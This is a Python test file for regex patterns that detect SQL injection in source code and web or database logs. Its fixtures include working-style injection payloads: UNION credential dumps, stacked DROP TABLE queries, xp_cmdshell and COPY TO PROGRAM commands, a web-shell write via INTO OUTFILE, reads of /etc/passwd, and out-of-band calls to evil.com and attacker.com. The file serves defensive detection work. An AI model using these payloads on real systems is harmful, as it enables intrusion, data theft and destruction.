"""Test SQL injection detection patterns used by the sql_injection role.

Tests the regex patterns for code audit (Python, Go, JavaScript) and
log audit (web server, database) against known-vulnerable and safe inputs.
"""

import re

# ── Code audit patterns (mirrors grep commands in code_audit.yml) ──────────

PYTHON_FSTRING_SQL = re.compile(
    r"(execute|executemany|executescript|raw)\s*\(\s*f['\"]"
)
PYTHON_FORMAT_SQL = re.compile(
    r"(execute|executemany|executescript|raw)\s*\(.*\.format\("
)
PYTHON_PERCENT_SQL = re.compile(
    r"(execute|executemany|executescript|raw)\s*\(.+%\s*\("
)
PYTHON_CONCAT_SQL = re.compile(
    r"(execute|executemany|executescript|raw)\s*\(.+\+"
)
PYTHON_BARE_SQL = re.compile(
    r"\.execute\s*\(\s*['\"].*(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|TRUNCATE|UNION|EXEC)",
    re.IGNORECASE,
)
PYTHON_DJANGO_RAW = re.compile(
    r"(\.raw\(|RawSQL\(|\.extra\(|connection\.cursor.*\.execute\(|\.cursor.*\.execute\()"
)
PYTHON_SQLALCHEMY_TEXT = re.compile(
    r"text\s*\(\s*f['\"]|text\s*\(.+\.format\(|text\s*\(.+%\(|text\s*\(.+\+\s*"
)
PYTHON_DYNAMIC_IDENT = re.compile(
    r"(table_name|column_name|order_by|group_by|sort_by|sort_direction)\s*=\s*"
)

GO_SPRINTF_SQL = re.compile(
    r"fmt\.Sprintf\s*\(.*(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|FROM|WHERE|JOIN)",
    re.IGNORECASE,
)
GO_CONCAT_SQL = re.compile(
    r"(db\.Query|db\.Exec|db\.QueryRow)\s*\(.*\+\s*"
)
GO_BARE_SQL = re.compile(
    r"(Query|Exec|QueryRow)\s*\(\s*['\"].*(SELECT|INSERT|UPDATE|DELETE)",
    re.IGNORECASE,
)

JS_TEMPLATE_SQL = re.compile(
    r"(\.query|\.execute|\.raw|\.all|\.run)\s*\(\s*`[^`]*(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE)",
    re.IGNORECASE,
)
JS_CONCAT_SQL = re.compile(
    r"(\.query|\.execute|\.raw|\.all|\.run)\s*\(.+\+"
)
JS_BARE_SQL = re.compile(
    r"(\.query|\.execute|\.raw)\s*\(\s*['\"]"
)


# ── Log audit patterns (mirrors grep commands in log_audit.yml) ────────────

LOG_UNION = re.compile(r"union\s+(all\s+)?select", re.IGNORECASE)
LOG_BOOLEAN = re.compile(
    r"(\d+=\d+|['\"]\s*=\s*['\"]|or\s+\d+=\d+|and\s+\d+=\d+|or\s+['\"]\w+['\"]\s*=\s*['\"]\w+['\"])",
    re.IGNORECASE,
)
LOG_TIME = re.compile(
    r"(sleep\(\d+\)|benchmark\(\d+|pg_sleep\(\d+|WAITFOR\s+DELAY|DBMS_LOCK\.SLEEP)",
    re.IGNORECASE,
)
LOG_INFO_SCHEMA = re.compile(
    r"(information_schema|sqlite_master|pg_database|sys\.databases|ALL_TABLES|v\$version)",
    re.IGNORECASE,
)
LOG_STACKED = re.compile(
    r";\s*(drop|insert|update|delete|alter|create|exec|truncate|grant|revoke)\s",
    re.IGNORECASE,
)
LOG_ENCODED = re.compile(
    r"(0x[0-9a-f]{6,}|CHAR\(\d|UNHEX\(|CONCAT\(0x|%27|%22|/\*\d{5})",
    re.IGNORECASE,
)
LOG_ADVANCED = re.compile(
    r"(xp_cmdshell|xp_dirtree|xp_regread|UTL_HTTP|UTL_FILE|LOAD_FILE|INTO\s+(OUTFILE|DUMPFILE)|COPY\s+.*PROGRAM)",
    re.IGNORECASE,
)


# ── Tests: Python code audit patterns ──────────────────────────────────────

class TestPythonSQLiDetection:
    """Test Python SQL injection pattern detection."""

    def test_fstring_sql_vulnerable(self):
        """f-string in execute() should be flagged."""
        vulnerable = [
            'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")',
            "connection.executemany(f\"INSERT INTO log VALUES ('{msg}')\")",
            'db.executescript(f"UPDATE users SET name=\'{name}\'")',
            "db.raw(f\"DELETE FROM cache WHERE key='{k}'\")",
        ]
        for code in vulnerable:
            assert PYTHON_FSTRING_SQL.search(code), f"Should detect: {code}"

    def test_fstring_sql_safe(self):
        """Parameterized query without f-string should NOT be flagged."""
        safe = [
            'cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))',
            'cursor.execute("SELECT * FROM users WHERE id = :id", {"id": val})',
            "f'User: {name}'",  # f-string but not in execute context
        ]
        for code in safe:
            assert not PYTHON_FSTRING_SQL.search(code), f"Should NOT flag: {code}"

    def test_format_sql_vulnerable(self):
        """.format() in execute() should be flagged."""
        vulnerable = [
            'cursor.execute("SELECT * FROM users WHERE id = {}".format(user_id))',
            'connection.executemany("INSERT INTO t VALUES ({})".format(vals))',
        ]
        for code in vulnerable:
            assert PYTHON_FORMAT_SQL.search(code), f"Should detect: {code}"

    def test_format_sql_safe(self):
        """format() not in execute context should NOT be flagged."""
        safe = [
            '"Hello {}".format(name)',  # format but not in execute
            'cursor.execute("SELECT * FROM t WHERE id = ?", [val])',
        ]
        for code in safe:
            assert not PYTHON_FORMAT_SQL.search(code), f"Should NOT flag: {code}"

    def test_percent_sql_vulnerable(self):
        """%-formatting in execute() should be flagged."""
        vulnerable = [
            'cursor.execute("SELECT * FROM t WHERE id = %s" % (user_id))',
            'db.executescript("SELECT * FROM t WHERE id = %(id)s" % {"id": val})',
        ]
        for code in vulnerable:
            assert PYTHON_PERCENT_SQL.search(code), f"Should detect: {code}"

    def test_percent_sql_safe(self):
        """DB-API parameterized %s (not string formatting) should NOT be flagged."""
        safe = [
            'cursor.execute("SELECT * FROM t WHERE id = %s", (user_id,))',
            'cursor.executemany("INSERT INTO t VALUES (%s, %s)", rows)',
        ]
        for code in safe:
            assert not PYTHON_PERCENT_SQL.search(code), f"Should NOT flag: {code}"

    def test_concat_sql_vulnerable(self):
        """String concatenation in execute() should be flagged."""
        vulnerable = [
            'cursor.execute("SELECT * FROM t WHERE id = " + user_id)',
            'db.raw("DELETE FROM t WHERE name = \'" + name + "\'")',
        ]
        for code in vulnerable:
            assert PYTHON_CONCAT_SQL.search(code), f"Should detect: {code}"

    def test_bare_sql_vulnerable(self):
        """Bare SQL keywords in execute() should be flagged."""
        vulnerable = [
            "cursor.execute('SELECT * FROM users WHERE active = 1')",
            'connection.execute("INSERT INTO audit VALUES (1, 2, 3)")',
            "db.execute('UPDATE config SET value = 10')",
            'cursor.execute("DELETE FROM sessions WHERE expired = true")',
        ]
        for code in vulnerable:
            assert PYTHON_BARE_SQL.search(code), f"Should detect: {code}"

    def test_bare_sql_safe(self):
        """execute() without SQL keywords should NOT be flagged."""
        safe = [
            "cursor.execute(stmt, params)",
            "cursor.execute(query_builder.build())",
            "cursor.execute(sql_template, bindings)",
        ]
        for code in safe:
            assert not PYTHON_BARE_SQL.search(code), f"Should NOT flag: {code}"

    def test_django_raw_vulnerable(self):
        """Django raw/extra/RawSQL should be flagged."""
        vulnerable = [
            "User.objects.raw('SELECT * FROM users WHERE id = %s' % uid)",
            "RawSQL('SELECT MAX(age) FROM users WHERE name = %s', [name])",
            "User.objects.extra(where=['name = %s' % user_input])",
            "with connection.cursor() as cursor: cursor.execute('SELECT ' + user_data)",
        ]
        for code in vulnerable:
            assert PYTHON_DJANGO_RAW.search(code), f"Should detect: {code}"

    def test_sqlalchemy_text_vulnerable(self):
        """SQLAlchemy text() with string formatting should be flagged."""
        vulnerable = [
            'text(f"SELECT * FROM t WHERE id = {uid}")',
            'text("SELECT * FROM t WHERE id = {}".format(uid))',
        ]
        for code in vulnerable:
            assert PYTHON_SQLALCHEMY_TEXT.search(code), f"Should detect: {code}"

    def test_sqlalchemy_text_safe(self):
        """SQLAlchemy text() with bound parameters should NOT be flagged."""
        safe = [
            'text("SELECT * FROM t WHERE id = :id").bindparams(id=uid)',
            'text("SELECT * FROM t WHERE name = :name")',
        ]
        for code in safe:
            assert not PYTHON_SQLALCHEMY_TEXT.search(code), f"Should NOT flag: {code}"

    def test_dynamic_identifiers(self):
        """Dynamic table/column names should be flagged."""
        vulnerable = [
            "table_name = user_provided",
            "order_by = request.GET.get('sort')",
            "group_by = raw_input",
        ]
        for code in vulnerable:
            assert PYTHON_DYNAMIC_IDENT.search(code), f"Should detect: {code}"


# ── Tests: Go code audit patterns ──────────────────────────────────────────

class TestGoSQLiDetection:
    """Test Go SQL injection pattern detection."""

    def test_sprintf_sql_vulnerable(self):
        """fmt.Sprintf with SQL keywords should be flagged."""
        vulnerable = [
            'db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = %d", uid))',
            "db.Exec(fmt.Sprintf(\"INSERT INTO log VALUES ('%s', %d)\", msg, code))",
            "db.Query(fmt.Sprintf(\"DELETE FROM cache WHERE key = '%s'\", k))",
        ]
        for code in vulnerable:
            assert GO_SPRINTF_SQL.search(code), f"Should detect: {code}"

    def test_sprintf_sql_safe(self):
        """fmt.Sprintf without SQL keywords should NOT be flagged."""
        safe = [
            'fmt.Sprintf("User %d: %s", id, name)',
            'fmt.Sprintf("http://%s:%d", host, port)',
        ]
        for code in safe:
            assert not GO_SPRINTF_SQL.search(code), f"Should NOT flag: {code}"

    def test_concat_sql_vulnerable(self):
        """String concatenation in db.Query/Exec should be flagged."""
        vulnerable = [
            'db.Query("SELECT * FROM t WHERE id = " + userInput)',
            'db.Exec("INSERT INTO t VALUES (" + val + ")")',
        ]
        for code in vulnerable:
            assert GO_CONCAT_SQL.search(code), f"Should detect: {code}"

    def test_concat_sql_safe(self):
        """Parameterized queries should NOT be flagged."""
        safe = [
            'db.Query("SELECT * FROM t WHERE id = ?", userID)',
            'db.Exec("INSERT INTO t VALUES (?)", val)',
        ]
        for code in safe:
            assert not GO_CONCAT_SQL.search(code), f"Should NOT flag: {code}"

    def test_bare_sql_vulnerable(self):
        """Bare SQL query strings should be flagged."""
        vulnerable = [
            'db.Query("SELECT * FROM users WHERE active = 1")',
            'tx.Exec("DELETE FROM sessions WHERE expired = true")',
        ]
        for code in vulnerable:
            assert GO_BARE_SQL.search(code), f"Should detect: {code}"


# ── Tests: JavaScript code audit patterns ──────────────────────────────────

class TestJavaScriptSQLiDetection:
    """Test JavaScript/TypeScript SQL injection pattern detection."""

    def test_template_literal_sql_vulnerable(self):
        """Template literals with SQL in query/execute should be flagged."""
        vulnerable = [
            'db.query(`SELECT * FROM users WHERE id = ${userId}`)',
            "connection.execute(`INSERT INTO log VALUES ('${msg}')`)",
            'db.raw(`DELETE FROM cache WHERE key = "${key}"`)',
        ]
        for code in vulnerable:
            assert JS_TEMPLATE_SQL.search(code), f"Should detect: {code}"

    def test_template_literal_sql_safe(self):
        """Template literals without SQL keywords should NOT be flagged."""
        safe = [
            'db.query(`User ${id}: ${name}`)',
            "console.log(`Status: ${code}`)",
        ]
        for code in safe:
            assert not JS_TEMPLATE_SQL.search(code), f"Should NOT flag: {code}"

    def test_concat_sql_vulnerable(self):
        """String concatenation in database methods should be flagged."""
        vulnerable = [
            'db.query("SELECT * FROM t WHERE id = " + userId)',
            'connection.execute("INSERT INTO t VALUES (" + val + ")")',
        ]
        for code in vulnerable:
            assert JS_CONCAT_SQL.search(code), f"Should detect: {code}"

    def test_bare_sql_vulnerable(self):
        """Bare query strings should be flagged."""
        vulnerable = [
            'db.query("SELECT * FROM users WHERE active = true")',
            "db.execute('DELETE FROM sessions WHERE old = 1')",
        ]
        for code in vulnerable:
            assert JS_BARE_SQL.search(code), f"Should detect: {code}"


# ── Tests: Log audit patterns ──────────────────────────────────────────────

class TestLogAuditDetection:
    """Test log analysis patterns for SQL injection attempts."""

    def test_union_select_in_logs(self):
        """UNION SELECT variants in log lines should be detected."""
        log_lines = [
            (
                '192.168.1.100 - - [12/Jul/2026:10:30:15 +0000] '
                '"GET /product?id=1 UNION SELECT username,password FROM users-- HTTP/1.1"'
            ),
            (
                '10.0.0.5 - admin [12/Jul/2026:10:31:00 +0000] '
                '"POST /login HTTP/1.1" body="id=1 UNION ALL SELECT null,null,null"'
            ),
            "GET /search?q=%27)+UNION SELECT+1,2,3--+ HTTP/1.1",
        ]
        for line in log_lines:
            assert LOG_UNION.search(line), f"Should detect UNION in: {line}"

    def test_boolean_blind_in_logs(self):
        """Boolean-based blind patterns should be detected."""
        log_lines = [
            'GET /item?id=1 AND 1=1 HTTP/1.1',
            "GET /page?name=admin' OR '1'='1 HTTP/1.1",
            "GET /user?id=2 or 1=1",
        ]
        for line in log_lines:
            assert LOG_BOOLEAN.search(line), f"Should detect boolean blind: {line}"

    def test_time_based_in_logs(self):
        """Time-based injection patterns should be detected."""
        log_lines = [
            "GET /search?q='+AND+SLEEP(5)-- HTTP/1.1",
            "GET /item?id=1; WAITFOR DELAY '0:0:5'--",
            "GET /page?id=1 AND BENCHMARK(1000000,MD5(1))",
            "GET /data?id=1 AND pg_sleep(10)",
            "GET /info?id=1 AND DBMS_LOCK.SLEEP(5)",
        ]
        for line in log_lines:
            assert LOG_TIME.search(line), f"Should detect time-based: {line}"

    def test_information_schema_probes(self):
        """Information schema probes should be detected."""
        log_lines = [
            "GET /search?q=' UNION SELECT table_name FROM information_schema.tables--",
            "GET /data?id=1 UNION SELECT name FROM sqlite_master",
            "GET /info?id=1 UNION SELECT datname FROM pg_database",
            "GET /user?id=1 UNION SELECT name FROM sys.databases",
            "GET /products?id=1 UNION SELECT table_name FROM ALL_TABLES",
            "GET /db?id=1 UNION SELECT banner FROM v$version",
        ]
        for line in log_lines:
            assert LOG_INFO_SCHEMA.search(line), f"Should detect: {line}"

    def test_stacked_query_attempts(self):
        """Stacked query attempts should be detected."""
        log_lines = [
            "GET /item?id=1; DROP TABLE users--",
            "GET /page?id=1'; INSERT INTO admins VALUES('evil',1)--",
            "GET /user?id=1; UPDATE users SET role='admin' WHERE id=1--",
            "GET /data?id=1; DELETE FROM audit_log--",
            "GET /admin?id=1; EXEC xp_cmdshell('whoami')--",
        ]
        for line in log_lines:
            assert LOG_STACKED.search(line), f"Should detect stacked: {line}"

    def test_encoded_payloads(self):
        """Encoded/obfuscated payloads should be detected."""
        log_lines = [
            "GET /search?q=%27%20UNION%20SELECT — URL-encoded quote",
            "GET /item?id=' UNION SELECT 0x554e494f4e — hex-encoded UNION",
            "GET /page?q=CHAR(85,78,73,79,78) — CHAR-encoded",
            "GET /data?id=1%22%20OR%20%221%22=%221 — double-encoded",
            "GET /user?id=1 UNHEX('554e494f4e') — UNHEX function",
        ]
        for line in log_lines:
            assert LOG_ENCODED.search(line), f"Should detect encoded: {line}"

    def test_advanced_exploitation(self):
        """Advanced exploitation patterns (xp_cmdshell, UTL_HTTP, etc.) should be detected."""
        log_lines = [
            "GET /exec?id=1; EXEC xp_cmdshell('whoami')--",
            "GET /file?id=1; EXEC xp_dirtree 'C:\\'",
            "GET /http?id=1 UNION SELECT UTL_HTTP.REQUEST('http://evil.com') FROM dual--",
            "GET /read?id=1 UNION SELECT LOAD_FILE('/etc/passwd')",
            "GET /write?id=1 UNION SELECT '<?php shell' INTO OUTFILE '/var/www/shell.php'",
            "GET /pg?id=1; COPY (SELECT 1) TO PROGRAM 'id'",
        ]
        for line in log_lines:
            assert LOG_ADVANCED.search(line), f"Should detect advanced: {line}"

    def test_safe_log_entries_not_flagged(self):
        """Normal log entries should not be flagged."""
        safe_lines = [
            'GET /index.html HTTP/1.1" 200 1024',
            'POST /api/login HTTP/1.1" 200 512',
            'GET /static/css/main.css HTTP/1.1" 304 0',
            'GET /favicon.ico HTTP/1.1" 404 0',
        ]
        for line in safe_lines:
            assert not LOG_UNION.search(line), f"Should NOT flag: {line}"
            assert not LOG_STACKED.search(line), f"Should NOT flag: {line}"
            assert not LOG_TIME.search(line), f"Should NOT flag: {line}"


# ── Tests: Cross-language edge cases ───────────────────────────────────────

class TestEdgeCases:
    """Edge cases that should not be false positives."""

    def test_legitimate_union_in_non_sql_context(self):
        """UNION SELECT in comments/docs/strings not in SQL context."""
        code_snippets = [
            '# This query uses UNION SELECT to combine results',
            '// Fetch data: UNION SELECT from two tables',
            'log.info("UNION SELECT returned 5 rows")',
            '-- UNION SELECT example in comment',
        ]
        for code in code_snippets:
            assert not PYTHON_BARE_SQL.search(code), f"False positive: {code}"

    def test_sleep_in_non_sql_context(self):
        """sleep() in non-SQL context should not be flagged as SQLi."""
        safe = [
            "time.sleep(60)",  # Known false positive in code context — acceptable in log audit
            "std::this_thread::sleep_for(std::chrono::seconds(5))",
            "// Comment: sqlmap uses wait delays to detect injection",
        ]
        # time.sleep(N) is a known false positive for the sleep(N) pattern
        # but acceptable because web logs don't contain Python code
        assert LOG_TIME.search(safe[0]), "time.sleep(N) matches sleep(N) — known FP, OK in log context"
        assert not LOG_TIME.search(safe[1]), f"Should NOT flag C++: {safe[1]}"
        assert not LOG_TIME.search(safe[2]), f"Should NOT flag comment: {safe[2]}"

    def test_legitimate_select_star(self):
        """Legitimate 'select *' in non-SQL context or test fixtures."""
        safe = [
            "# select all items from cache",
            "// select * from dict keys",
            "result = data.select(lambda x: x > 5)",  # functional select
        ]
        for line in safe:
            assert not LOG_INFO_SCHEMA.search(line), f"False positive: {line}"

    def test_parametrized_queries_all_languages(self):
        """Parameterized queries in all languages should be safe."""
        queries = [
            # Python
            'cursor.execute("SELECT * FROM t WHERE id = ?", (uid,))',
            'cursor.execute("SELECT * FROM t WHERE id = :id", {"id": uid})',
            'cursor.execute("SELECT * FROM t WHERE id = %s", (uid,))',
            # Go
            'db.Query("SELECT * FROM t WHERE id = ?", userID)',
            'db.Query("SELECT * FROM t WHERE id = $1", userID)',
            # JavaScript
            'db.query("SELECT * FROM t WHERE id = ?", [userId])',
            'db.query("SELECT * FROM t WHERE id = $1", [userId])',
            'db.execute("INSERT INTO t (name) VALUES (?)", [name])',
        ]
        for q in queries:
            assert not PYTHON_FSTRING_SQL.search(q), f"False positive on f-string: {q}"
            assert not PYTHON_FORMAT_SQL.search(q), f"False positive on format: {q}"
            assert not PYTHON_CONCAT_SQL.search(q), f"False positive on concat: {q}"
            assert not GO_SPRINTF_SQL.search(q), f"False positive go sprintf: {q}"
            assert not GO_CONCAT_SQL.search(q), f"False positive go concat: {q}"
            assert not JS_TEMPLATE_SQL.search(q), f"False positive js template: {q}"
            assert not JS_CONCAT_SQL.search(q), f"False positive js concat: {q}"


# ── Tests: Attack vector patterns from data files ──────────────────────────

class TestAttackVectorPatterns:
    """Verify regex patterns match the documented attack vectors."""

    def test_classic_vectors_match(self):
        """Each classic attack vector example should match its detection pattern."""
        vectors: dict[str, str] = {
            "UNION SELECT": "' UNION SELECT username, password FROM users--",
            "Error-based": "extractvalue(1,concat(0x7e,(SELECT database())))",
            "Boolean blind": "AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'",
            "Time-based": "WAITFOR DELAY '0:0:5'",
            "Stacked": "'; DROP TABLE users; SELECT * FROM data WHERE '1'='1",
            "Out-of-band": (
                "DECLARE @q varchar(99); "
                "SET @q='\\\\attacker.com\\'+SELECT @@version; "
                "EXEC master..xp_dirtree @q"
            ),
        }

        assert LOG_UNION.search(vectors["UNION SELECT"])
        assert LOG_TIME.search(vectors["Time-based"])
        assert LOG_STACKED.search(vectors["Stacked"])
        assert LOG_ADVANCED.search(vectors["Out-of-band"])

    def test_dbms_specific_functions(self):
        """DBMS-specific functions should match their respective patterns."""
        # MySQL
        assert LOG_TIME.search("SLEEP(5)")
        assert LOG_TIME.search("BENCHMARK(1000000,SHA1(1))")
        # PostgreSQL
        assert LOG_TIME.search("pg_sleep(10)")
        assert LOG_ADVANCED.search("COPY (SELECT 1) TO PROGRAM 'id'")
        # MSSQL
        assert LOG_TIME.search("WAITFOR DELAY '0:0:5'")
        assert LOG_ADVANCED.search("EXEC xp_cmdshell('whoami')")
        # Oracle
        assert LOG_TIME.search("DBMS_LOCK.SLEEP(5)")
        assert LOG_ADVANCED.search("UTL_HTTP.REQUEST('http://evil.com')")

    def test_bypass_techniques_match(self):
        """Bypass technique examples should match appropriate log patterns."""
        # Comment obfuscation — comment-split UNION SELECT evades raw regex
        # (that's why it's an effective bypass — requires comment-stripping first)
        assert not LOG_UNION.search("UN/**/ION SE/**/LECT"), (
            "Comment-split UNION SELECT should NOT match raw regex — "
            "this is why comment stripping is necessary before matching"
        )
        # After comment stripping (simulated): UNION SELECT matches
        assert LOG_UNION.search("UNION SELECT")
        # Whitespace alternatives
        assert LOG_UNION.search("UNION\nSELECT")  # newline
        assert LOG_UNION.search("UNION\tSELECT")  # tab
        # Case variation — case-insensitive patterns handle this
        assert LOG_UNION.search("uNiOn SeLeCt")
        # Hex encoding
        assert LOG_ENCODED.search("0x554e494f4e2053454c454354")
        assert LOG_ENCODED.search("CHAR(85,78,73,79,78)")
        # URL encoding — LOG_ENCODED detects %27 (single-quote), %22 (double-quote)
        assert LOG_ENCODED.search("%27%20UNION%20SELECT")  # URL-encoded quote+space
        assert LOG_ENCODED.search("%27")  # single-encoded quote
        assert LOG_ENCODED.search("%22")  # single-encoded double-quote

    def test_safe_orm_usage(self):
        """ORM usage patterns should NOT be flagged as SQLi."""
        orm_code = [
            "User.objects.filter(id=user_id)",
            "session.query(User).filter(User.name == name)",
            "User.select().where(User.active == True)",
            "db.Where('id = ?', userID).Find(&user)",
            "prisma.user.findUnique({ where: { id: userId } })",
            "User.findAll({ where: { email: userEmail } })",
        ]
        for code in orm_code:
            assert not PYTHON_FSTRING_SQL.search(code), f"ORM false positive: {code}"
            assert not PYTHON_CONCAT_SQL.search(code), f"ORM false positive: {code}"
            assert not GO_SPRINTF_SQL.search(code), f"ORM false positive: {code}"
            assert not JS_TEMPLATE_SQL.search(code), f"ORM false positive: {code}"
